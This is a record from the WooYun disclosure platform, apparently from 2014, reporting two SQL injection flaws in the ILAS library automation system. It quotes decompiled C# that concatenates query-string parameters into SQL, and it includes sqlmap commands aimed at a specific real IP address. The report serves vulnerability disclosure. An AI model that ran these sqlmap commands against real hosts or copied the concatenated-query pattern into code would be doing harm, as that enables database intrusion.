{"id": 55328, "wybug_id": "wooyun-2014-061313", "wybug_title": "某图书馆自动化集成系统两个SQL注入", "wybug_corp": "深圳市科图自动化新技术应用公司", "wybug_author": "abcdlzy", "wybug_date": "2014-05-20 13:11", "wybug_open_date": "2014-08-18 13:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向公众公开  简要描述： 随着ILAS人不断的努力，ILAS已成为国内用户数最多、推广面最广、实用性最强、联网性能最佳的图书馆自动化集成系统，它改写了国内图书馆自动化管理多依赖国外进口软件的历史。在第62届国际图联大会期间展出时，被誉为“中国图书馆自动化的骄傲”。ILAS先后获得国家“科技进步三等奖”、文化部“科技进步一等奖”和广东省文化厅“科技进步一等奖”等十多个奖项。 详细说明：  NTReaderCritic.aspxNTUniBookRetrInfo.aspx两个页面   漏洞证明：  NTReaderCritic.aspx\nsqlmap -u \"http://202.193.70.138/NTReaderCritic.aspx?strRenco=1&strTitle=1\"\n\n\n\nprotected void Page_Load(object sender, EventArgs e){    if (!base.IsPostBack)    {        if ((base.Request.QueryString[\"strRenco\"] != null) && (base.Request.QueryString[\"strTitle\"] != null))        {            this.Label2.Text = base.Request.QueryString[\"strTitle\"].ToString();        }        else        {            return;        }        this.NewMethod();    }}\n当strRenco和strTitle均不为空时执行this.NewMethod();并且两个变量用户可控跟进\nprivate void NewMethod(){    this.m_ilas.SysCheck();    OleDbDataReader reader = new OleDbCommand(\"select count(*) as COUNT from bookcritic where bib_recno=\" + base.Request.QueryString[\"strRenco\"].ToString(), this.m_ilas.conn).ExecuteReader();\n 发现strRenco直接被带进SQL参数里面执行产生sql注入NTUniBookRetrInfo.aspx\nsqlmap -u \"http://202.193.70.138/NTSpecialBookRetrInfo.aspx?BookRecno=1\"\n\n\n\nprotected void Page_Load(object sender, EventArgs e){    if (!base.IsPostBack)    {        this.m_ilas.SysCheck();        if (base.Request.QueryString[\"BookRecno\"] != null)        {            string strRecno = base.Request.QueryString[\"BookRecno\"].ToString();            this.GetMarcData(strRecno);            this.GetHoldingByBookRecno(strRecno);        }        this.m_ilas.IlasClose();    }}\nBookRecno用户可控,跟进\nprivate void GetMarcData(string strRecno){    this.unilist = new ArrayList();    OleDbDataReader reader = new OleDbCommand(\" select MRC0,MRCC from(select MRC0,MRCC from unibib where  MRC0=\" + strRecno + \" union all select MRC0,MRCC from unibibus where MRC0=\" + strRecno + \" union all select MRC0,MRCC from uniser where MRC0=\" + strRecno + \" union all select MRC0,MRCC from uniserus where MRC0=\" + strRecno + \")\", this.m_ilas.conn).ExecuteReader();    if (reader.Read())\n\nprivate void GetHoldingByBookRecno(string strRecno){    this.list = new ArrayList();    string cmdText = \"SELECT UNIHOLD.*  FROM UNIHOLD WHERE  HLDb=\" + strRecno + \"  order by HLD9 desc\";\n上述两个函数都是运行用户直接操控SQL语句导致注入   修复方案：  严格检查来自于用户的数据   版权声明：转载请注明来源 abcdlzy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-25 09:08 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}